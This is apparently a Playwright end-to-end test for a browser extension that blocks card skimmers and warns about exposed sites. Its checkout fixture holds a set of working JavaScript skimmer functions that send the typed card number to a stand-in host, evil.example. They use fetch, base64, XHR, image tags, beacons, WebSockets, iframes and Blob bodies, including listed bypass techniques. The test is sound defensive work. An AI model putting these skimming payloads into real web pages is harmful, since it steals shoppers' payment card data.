#!/usr/bin/env python3
"""End-to-end test of Card Guard, Password Guard and Check a site in real Chromium.
Run: python3 build.py && python3 tests/e2e_cards.py"""
import json, sys, threading, time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from playwright.sync_api import sync_playwright

ROOT = Path(__file__).resolve().parent.parent
EXT = ROOT / "dist/chrome"
CARD = "4111 1111 1111 1111"
DIGITS = CARD.replace(" ", "")

SHOP = """<h1>Checkout</h1>
<form id="f" action="http://evil.example:8101/form" method="post">
  <input type="hidden" name="action" value="woocommerce_checkout">
  <input id="name" name="name" placeholder="Name on card">
  <input id="cc" name="cardnumber" autocomplete="cc-number" placeholder="Card number">
  <input id="cvv" name="cvc" placeholder="CVC">
  <button id="pay">Pay</button>
</form>
<script>
  // Monitoring/framework libraries wrap fetch and XHR like this; they must keep working.
  const of = window.fetch; window.fetch = function (...a) { window.fw = (window.fw || 0) + 1; return of.apply(this, a); };
  const os = XMLHttpRequest.prototype.send; XMLHttpRequest.prototype.send = function (b) { window.xw = (window.xw || 0) + 1; return os.call(this, b); };
  const v = () => document.getElementById('cc').value;
  const done = (p) => p.then(() => 'sent', () => 'blocked');
  window.skimFetch  = () => done(fetch('http://evil.example:8101/c', { method: 'POST', body: JSON.stringify({ cc: v() }) }));
  window.skimB64    = () => done(fetch('http://evil.example:8101/b', { method: 'POST', body: 'd=' + btoa('n=' + v()) }));
  window.skimXhr    = () => { const x = new XMLHttpRequest(); x.open('POST', 'http://evil.example:8101/x'); x.send('cc=' + encodeURIComponent(v())); return 'done'; };
  window.skimImg    = () => { new Image().src = 'http://evil.example:8101/i.gif?c=' + encodeURIComponent(v()); return 'done'; };
  window.skimAttr   = () => { const i = document.createElement('img'); i.setAttribute('src', 'http://evil.example:8101/a.gif?c=' + v()); return 'done'; };
  window.skimBeacon = () => navigator.sendBeacon('http://evil.example:8101/beacon', v());
  window.skimSubmit = () => { document.getElementById('f').submit(); return 'done'; };
  // Reviewer's bypasses
  window.skimPath   = () => done(fetch('http://evil.example:8101/p/' + btoa(JSON.stringify({ n: v() }))));
  window.skimFrame  = () => { const f = document.createElement('iframe'); document.body.appendChild(f); return done(f.contentWindow.fetch('http://evil.example:8101/frame', { method: 'POST', body: v() })); };
  window.skimHtml   = () => { document.body.insertAdjacentHTML('beforeend', '<img src="http://evil.example:8101/h.gif?c=' + v() + '">'); const d = document.createElement('div'); d.innerHTML = '<img src="http://evil.example:8101/h2.gif?c=' + v() + '">'; return 'done'; };
  window.skimWs     = () => { try { new WebSocket('ws://evil.example:8101/ws?c=' + v().replace(/ /g, '')); return 'sent'; } catch (e) { return 'blocked'; } };
  window.skimBlobB  = () => navigator.sendBeacon('http://evil.example:8101/blobbeacon', new Blob([v()]));
  window.skimBlobF  = () => done(fetch('http://evil.example:8101/blobfetch', { method: 'POST', body: new Blob([JSON.stringify({ c: v() })]) }));
  window.xhrEvents  = () => new Promise((r) => { const x = new XMLHttpRequest(); x.open('POST', 'http://evil.example:8101/xe'); x.onerror = () => r('error'); x.send(v()); setTimeout(() => r('hang'), 1500); });
  window.preXhr     = new XMLHttpRequest(); preXhr.open('POST', 'http://evil.example:8101/preopened');
  window.skimPre    = () => { preXhr.send(v()); return 'done'; };
  window.wsConsts   = () => [WebSocket.OPEN, WebSocket.CLOSED, typeof EventSource !== 'undefined' ? EventSource.CLOSED : 2].join(',');
  window.ownXhr     = () => { const x = new XMLHttpRequest(); x.open('POST', '/api/xhr'); x.send('cc=' + v()); return 'done'; };
  window.ownApi     = () => done(fetch('/api/pay', { method: 'POST', body: JSON.stringify({ cc: v() }) }));
  window.stripe     = () => done(fetch('http://api.stripe.com:8101/v1/tokens', { method: 'POST', body: 'card[number]=' + v() }));
  window.analytics  = () => done(fetch('http://stats.example:8101/collect?v=2&t=1700000000123'));
</script>"""

GIFT = """<input id="gift" name="giftcode" placeholder="Gift card code"><input id="ean" type="search" name="q">
<script>
  window.send  = () => fetch('http://giftcards.example:8101/redeem', { method: 'POST', body: document.getElementById('gift').value }).then(() => 'sent', () => 'blocked');
  window.send2 = () => fetch('http://search.example:8101/q?x=' + document.getElementById('ean').value).then(() => 'sent', () => 'blocked');
</script>"""

LOGIN = """<form><input id="u" name="username"><input id="pw" type="password" name="password"></form>"""

received = []

class H(BaseHTTPRequestHandler):
    def _log(self, body=b""):
        received.append((self.headers.get("Host", ""), self.path, body.decode(errors="ignore")))
    def do_GET(self):
        self._log()
        page = {"/shop": SHOP, "/login": LOGIN, "/gift": GIFT}.get(self.path.split("?")[0], "<h1>ok</h1>")
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Access-Control-Allow-Origin", "*")
        if "exposed" in self.path:
            self.send_header("X-Powered-By", "PHP/8.2.10")
        if "patched" in self.path:
            self.send_header("X-Powered-By", "PHP/8.3.36")
        self.end_headers()
        self.wfile.write(f"<html><head></head><body>{page}</body></html>".encode())
    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        self._log(self.rfile.read(n))
        self.send_response(200); self.send_header("Access-Control-Allow-Origin", "*"); self.end_headers(); self.wfile.write(b"ok")
    def do_OPTIONS(self):
        self.send_response(204); self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "*"); self.send_header("Access-Control-Allow-Methods", "*"); self.end_headers()
    def log_message(self, *a): pass

failures = 0
def check(cond, label):
    global failures
    print(("PASS " if cond else "FAIL ") + label)
    failures += 0 if cond else 1

def leaked(prefix):
    return any(h.startswith("evil.example") and p.startswith(prefix) and (DIGITS in (p + b).replace("%20", "").replace(" ", "").replace("+", "") or "bj0" in b)
               for h, p, b in received)

def evil_hits(prefix):
    return [r for r in received if r[0].startswith("evil.example") and r[1].startswith(prefix)]

def main():
    srv = ThreadingHTTPServer(("127.0.0.1", 8101), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    base = "http://shop.example:8101"
    with sync_playwright() as p:
        ctx = p.chromium.launch_persistent_context(
            "", headless=True, channel="chromium",
            args=[f"--disable-extensions-except={EXT}", f"--load-extension={EXT}",
                  "--host-resolver-rules=MAP *.example 127.0.0.1, MAP api.stripe.com 127.0.0.1"])
        sw = ctx.service_workers[0] if ctx.service_workers else ctx.wait_for_event("serviceworker")
        ext_id = sw.url.split("/")[2]
        warm = ctx.new_page(); warm.goto(base + "/"); time.sleep(0.5); warm.close()

        def window_titles():
            out = []
            for pg in list(ctx.pages):
                if "warning.html" not in pg.url: continue
                try: out.append(pg.inner_text("#title", timeout=2000))
                except Exception: pass
            return out
        def close_warnings():
            for pg in list(ctx.pages):
                if "warning.html" in pg.url: pg.close()

        # ---------- not-exposed store: no heads-up, anti-skimmer still on
        page = ctx.new_page(); page.goto(base + "/shop?patched=1"); time.sleep(0.4)
        check(page.evaluate("skimFetch()") == "sent", "before any card is typed, nothing is touched")
        received.clear()
        page.click("#cc"); time.sleep(0.4)
        check(not window_titles(), "patched store: no heads-up on the card field")
        with ctx.expect_page(timeout=6000) as info:
            page.keyboard.type(CARD, delay=10)
            time.sleep(0.2)
            r = page.evaluate("skimFetch()")
        w = info.value; w.wait_for_load_state(); time.sleep(0.3)
        check(r == "blocked", "skimmer fetch → blocked")
        check("stopped your card number" in w.inner_text("#title"), "skimmer warning window opens")
        check("evil.example" in w.inner_text("#reasons"), "warning names where it was going")
        w.close()
        check(page.evaluate("skimB64()") == "blocked", "base64-encoded skim → blocked")
        page.evaluate("skimXhr()"); page.evaluate("skimImg()"); page.evaluate("skimAttr()")
        check(page.evaluate("skimBeacon()") is False, "sendBeacon skim → blocked")
        time.sleep(0.6)
        check(not evil_hits("/c") and not evil_hits("/b") and not evil_hits("/x") and not evil_hits("/i.gif") and not evil_hits("/a.gif") and not evil_hits("/beacon"),
              "no card data reached the skimmer server (fetch, base64, XHR, img, setAttribute, beacon)")
        check(page.evaluate("ownApi()") == "sent" and any(p == "/api/pay" and DIGITS in b.replace(" ", "") for _, p, b in received), "store's own backend still gets the card")
        check(page.evaluate("stripe()") == "sent", "payment provider (Stripe) still gets the card")
        check(page.evaluate("analytics()") == "sent", "unrelated requests keep working")
        page.evaluate("ownXhr()"); time.sleep(0.3)
        check(page.evaluate("window.fw > 3 && window.xw >= 1"), "libraries that wrap fetch/XHR keep working (and are still guarded)")
        check(page.evaluate("skimPath()") == "blocked", "base64 in the URL path → blocked")
        check(page.evaluate("skimFrame()") == "blocked", "fetch from a fresh iframe → blocked")
        page.evaluate("skimHtml()")
        check(page.evaluate("skimWs()") == "blocked", "WebSocket to the skimmer → blocked")
        page.evaluate("skimBlobB()")   # checked asynchronously; verified below that nothing arrives
        check(page.evaluate("skimBlobF()") == "blocked", "fetch with a Blob body → blocked")
        page.evaluate("skimPre()")
        check(page.evaluate("wsConsts()") == "1,3,2", "WebSocket.OPEN & co. still work after arming (chat widgets)")
        check(page.evaluate("xhrEvents()") == "error", "blocked XHR fails like a network error (no hanging spinner)")
        time.sleep(0.6)
        check(not evil_hits("/p/") and not evil_hits("/frame") and not evil_hits("/h") and not evil_hits("/ws") and not evil_hits("/blob") and not evil_hits("/xe") and not evil_hits("/preopened"),
              "none of those reached the skimmer server")
        page.evaluate("skimSubmit()"); time.sleep(0.6)
        check(not evil_hits("/form"), "form.submit() to a foreign site → blocked")
        check(len([t for t in window_titles()]) <= 1, "one skimmer warning per page, no spam")
        close_warnings()
        with ctx.expect_page(timeout=6000) as info:
            page.click("#pay")
        w = info.value; w.wait_for_load_state(); time.sleep(0.3)
        check("Send your card number to evil.example" in w.inner_text("#title"), "clicking Pay on a form posting to an unknown site → PHPeek asks")
        w.click("#stop"); time.sleep(0.6)
        check(not evil_hits("/form"), "'Don't send' → nothing reaches that site")
        with ctx.expect_page(timeout=6000) as info:
            page.click("#pay")
        w = info.value; w.wait_for_load_state(); time.sleep(0.3)
        try: w.click("#go", no_wait_after=True)
        except Exception: pass
        time.sleep(1.0)
        check(evil_hits("/form"), "'Send it anyway' → the form goes through (for payment services PHPeek doesn't know)")
        close_warnings(); page.close()
        received.clear()
        page = ctx.new_page(); page.goto(base + "/shop?patched=1"); time.sleep(0.4)
        page.evaluate("""() => document.getElementById('f').addEventListener('submit', function (e) { e.preventDefault(); window.validated = 1; this.submit(); })""")
        page.click("#cc"); page.keyboard.type(CARD, delay=5)
        with ctx.expect_page(timeout=6000) as info:
            page.click("#pay")
        w = info.value; w.wait_for_load_state(); time.sleep(0.3)
        try: w.click("#go", no_wait_after=True)
        except Exception: pass
        time.sleep(1.2)
        check(evil_hits("/form"), "'Send it anyway' also works when the page validates first and calls form.submit()")
        check(not any("stopped" in t for t in window_titles()), "…and doesn't pop a 'stopped' window right after you said send")
        close_warnings(); page.close()

        # ---------- false alarms
        page = ctx.new_page(); page.goto(base + "/gift?patched=1"); time.sleep(0.4)
        page.click("#gift"); page.keyboard.type("6035710012345674", delay=5)
        check(page.evaluate("send()") == "sent", "gift card number in a non-card field doesn't arm the guard")
        page.click("#ean"); page.keyboard.type("4006381333931", delay=5)
        check(page.evaluate("send2()") == "sent", "a barcode (EAN-13) doesn't arm the guard")
        page.close()
        page = ctx.new_page(); page.goto(base + "/shop?patched=1"); time.sleep(0.4)
        page.evaluate("""() => { const i = document.getElementById('cc'); i.value = '4111111111111111'; i.dispatchEvent(new Event('input', {bubbles:true})); }""")
        check(page.evaluate("skimFetch()") == "blocked", "a script-filled card number is still protected")
        time.sleep(0.8)
        check(not window_titles(), "…but a page can't make PHPeek pop up windows by faking input")
        page.evaluate("""() => { const f = document.createElement('iframe'); f.id = 'sd'; f.srcdoc = '<input id=c autocomplete=cc-number>'; document.body.appendChild(f); }""")
        time.sleep(0.5)
        fr = page.frame_locator("#sd")
        fr.locator("#c").click(); fr.locator("#c").type(CARD, delay=5)
        res = page.evaluate("""() => document.getElementById('sd').contentWindow.fetch('/api/srcdoc', {method:'POST', body: document.getElementById('sd').contentDocument.getElementById('c').value}).then(() => 'sent', () => 'blocked')""")
        check(res == "sent", "card form inside a srcdoc frame can still post to the store itself")
        close_warnings(); page.close()

        # ---------- exposed store: heads-up once at the card field
        page = ctx.new_page(); page.goto(base + "/shop?exposed=1"); time.sleep(0.5)
        with ctx.expect_page(timeout=6000) as info:
            page.click("#cc")
        w = info.value; w.wait_for_load_state(); time.sleep(0.3)
        check("Careful paying" in w.inner_text("#title"), "exposed store: heads-up when you reach the card field")
        check("PayPal" in w.inner_text("#reasons"), "suggests a safer way to pay")
        check(w.inner_text("#stop") == "Got it" and w.is_hidden("#go"), "it's a notice, nothing to approve")
        w.close()
        page.click("#name"); page.click("#cc"); time.sleep(0.6)
        check(not window_titles(), "no second heads-up on the same site")
        page.reload(); time.sleep(0.5); page.click("#cc"); time.sleep(0.6)
        check(not window_titles(), "still none after reloading the page")
        page.close()

        # ---------- Password Guard
        page = ctx.new_page(); page.goto(base + "/login?exposed=1"); time.sleep(0.5)
        page.click("#u"); time.sleep(0.4)
        check(not window_titles(), "username field: no warning")
        with ctx.expect_page(timeout=6000) as info:
            page.click("#pw")
        w = info.value; w.wait_for_load_state(); time.sleep(0.3)
        check("password" in w.inner_text("#title").lower(), "exposed site: heads-up at the password field")
        check("two-factor" in w.inner_text("#reasons"), "advises a unique password + 2FA")
        w.close(); page.close()
        page = ctx.new_page(); page.goto(base + "/login?patched=1"); time.sleep(0.5)
        page.click("#pw"); time.sleep(0.6)
        check(not window_titles(), "patched site: no password warning")
        page.close()

        # ---------- Check a site (popup)
        pop = ctx.new_page(); pop.goto(f"chrome-extension://{ext_id}/popup.html")
        def check_site(url):
            pop.fill("#curl", url); pop.click("#cbtn")
            for _ in range(150):
                time.sleep(0.1)
                if pop.inner_text("#cbtn") == "Check" and pop.locator("#cres .status").count():
                    return pop.inner_text("#cres")
            return ""

        out = check_site("http://exposed.example:8101/shop?exposed=1")
        check("exposed.example" in out and "exposed" in out.lower(), f"check exposed site → flagged ({out.splitlines()[0]})")
        out = check_site("http://ok.example:8101/?patched=1")
        check("patched" in out.lower(), "check patched site → all good")
        check("8.3" not in out and "8.2" not in out, "never shows the exact version")
        out = check_site("not a url")
        check("doesn't look like" in out, "garbage input → friendly error")
        out = check_site("http://nothing-here.invalid")
        check("Couldn't reach" in out, "unreachable site → friendly error")
        hits = [r for r in received if r[0].startswith("exposed.example")]
        check(hits and all("Cookie" not in str(r) for r in hits), "check request reached only that site")
        pop.close()
        ctx.close()
    print(f"\n{'ALL PASSED' if not failures else f'{failures} FAILED'}")
    sys.exit(1 if failures else 0)

if __name__ == "__main__":
    main()
